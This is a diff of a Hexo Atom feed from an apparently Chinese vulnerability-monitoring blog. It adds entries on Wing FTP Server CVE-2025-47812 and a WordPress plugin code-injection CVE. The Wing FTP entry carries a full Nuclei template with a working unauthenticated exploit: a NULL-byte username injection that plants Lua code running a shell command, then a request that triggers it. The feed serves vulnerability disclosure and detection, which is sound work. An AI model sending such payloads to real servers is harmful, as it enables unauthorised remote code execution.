@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-01T16:00:05.729Z</updated>
+  <updated>2025-07-01T16:00:36.878Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,59 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Wing FTP Server 未认证远程代码执行漏洞</title>
+    <link href="http://example.com/2025/07/01/github_2623161150/"/>
+    <id>http://example.com/2025/07/01/github_2623161150/</id>
+    <published>2025-07-01T16:00:36.879Z</published>
+    <updated>2025-07-01T16:00:36.878Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wing FTP Server 未认证远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-47812</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Wing FTP Server 7.4.4之前的版本存在一个未认证的远程代码执行漏洞（CVE-2025-47812）。此漏洞源于登录时’username’参数中NULL字节的不当处理，导致Lua代码注入到会话文件中。当访问认证功能（如&#x2F;dir.html）时，这些恶意构造的会话文件随后被执行，导致服务器上以提升的权限执行任意命令。</p><p><strong>产品厂商：</strong> wftpserver</p><p><strong>产品名称：</strong> Wing FTP Server</p><p><strong>影响版本：</strong> * &lt; 7.4.4</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c30079e13dde0110472f7ece21a216d26544fbd7/http%2Fcves%2F2025%2FCVE-2025-47812.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c30079e13dde0110472f7ece21a216d26544fbd7/http%2Fcves%2F2025%2FCVE-2025-47812.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-47812-wing-ftp-rce</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wing FTP Server - Unauthenticated RCE (CVE-2025-47812)</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">4m3rr0r</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)</span><br><span class="hljs-attribute">    flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the &#x27;username&#x27;</span><br><span class="hljs-attribute">    parameter during login, leading to Lua code injection into session files. These maliciously crafted</span><br><span class="hljs-attribute">    session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,</span><br><span class="hljs-attribute">    resulting in arbitrary command execution on the server with elevated privileges.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/4m3rr0r/CVE-2025-47812-poc</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-47812</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.97</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.99</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:a:wftpserver:wing_ftp_server:*:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rce, wingftp, unauth, luainjection, cve, critical</span><br><br><span class="hljs-attribute">flow</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>  <span class="hljs-attribute">http(1) &amp;&amp; http(2)</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /loginok.html HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">en-US,en;q=0.5</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>        <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>        <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;BaseURL&#125;&#125;</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;BaseURL&#125;&#125;/login.html?lang=english</span><br>        <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">client_lang=english</span><br>        <span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>        <span class="hljs-attribute">Priority</span><span class="hljs-punctuation">:</span> <span class="hljs-string">u=0, i</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;len(&quot;username=anonymous%00]]%0dlocal+h+%3d+io.popen(\&quot;whoami\&quot;)%0dlocal+r+%3d+h%3aread(\&quot;*a\&quot;)%0dh%3aclose()%0dprint(r)%0d--&amp;password=&quot;)&#125;&#125;</span><br><br>        <span class="hljs-attribute">username=anonymous%00]]%0dlocal+h+%3d+io.popen(&quot;whoami&quot;)%0dlocal+r+%3d+h%3aread(&quot;*a&quot;)%0dh%3aclose()%0dprint(r)%0d--&amp;password=</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    extractors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">uid</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;UID=([^;]+)&quot;</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET /dir.html HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">en-US,en;q=0.5</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>        <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UID=&#123;&#123;uid&#125;&#125;</span><br>        <span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>        <span class="hljs-attribute">Priority</span><span class="hljs-punctuation">:</span> <span class="hljs-string">u=0, i</span><br><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;status_code == 200&#x27;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;contains(body, &quot;nt authority\\system&quot;) || contains(body, &quot;root&quot;)&#x27;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Wing FTP Server 未认证远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WordPress Custom Login And Signup Widget Plugin 任意代码执行漏洞</title>
+    <link href="http://example.com/2025/07/01/github_3008354625/"/>
+    <id>http://example.com/2025/07/01/github_3008354625/</id>
+    <published>2025-07-01T16:00:20.722Z</published>
+    <updated>2025-07-01T16:00:20.717Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WordPress Custom Login And Signup Widget Plugin 任意代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49029</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress Custom Login And Signup Widget Plugin 1.0及以下版本存在任意代码执行漏洞，攻击者可以利用此漏洞执行任意代码。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> Custom Login And Signup Widget Plugin</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.0</p><p><strong>来源：</strong> <a href="https://github.com/Nxploited/CVE-2025-49029">https://github.com/Nxploited/CVE-2025-49029</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WordPress Custom Login And Signup Widge</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Improper Control of Generation of Code (&#39;Code Injection&#39;) vulnerability in bittoKazi Custom</title>
@@ -484,56 +537,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>offsectraining twitter update</title>
-    <link href="http://example.com/2025/07/01/twitter_3624300501/"/>
-    <id>http://example.com/2025/07/01/twitter_3624300501/</id>
-    <published>2025-07-01T12:00:34.006Z</published>
-    <updated>2025-07-01T12:00:34.002Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> offsectraining</p><p><strong>推文：</strong> 🚨 2025年6月内容与平台更新公告！<br>🔗 <a href="https://t.co/kagxE4Idhl">https://t.co/kagxE4Idhl</a> </p><p>如果你错过了，这里有我们上个月发布的所有内容：</p><p>🔥 2条新学习路径：<br>🔗 <a href="https://t.co/srPxt4ooiy">https://t.co/srPxt4ooiy</a><br>🔗 <a href="https://t.co/MuEOnVoR42">https://t.co/MuEOnVoR42</a></p><p>🪲 10个新的CVE实验室</p><p>🧠 还有大量新的学习内容！</p><p><strong>链接：</strong> <a href="https://x.com/offsectraining/status/1940003444233830740">https://x.com/offsectraining/status/1940003444233830740</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offsectraining&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 2025年6月内容与平台更新公告！&lt;br&gt;🔗 &lt;a href=&quot;https://t.co/kagxE4Idhl&quot;&gt;https://t.co</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="offsectraining" scheme="http://example.com/tags/offsectraining/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/07/01/twitter_2132729342/"/>
-    <id>http://example.com/2025/07/01/twitter_2132729342/</id>
-    <published>2025-07-01T12:00:25.593Z</published>
-    <updated>2025-07-01T12:00:25.590Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 别错过#BHUSA简报会“高级Active Directory至Entra ID横向移动技术”。我们将介绍几种新的横向移动技术，这些技术能让我们绕过认证、多因素认证(MFA)、隐秘地窃取数据等更多内容&gt;&gt; <a href="https://t.co/kAYs26BaiZ">https://t.co/kAYs26BaiZ</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940012514172924334">https://x.com/BlackHatEvents/status/1940012514172924334</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 别错过#BHUSA简报会“高级Active Directory至Entra ID横向移动技术”。我们将介绍几种新的横向移动技术，这些技术能让我们绕</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
     
   </entry>
   
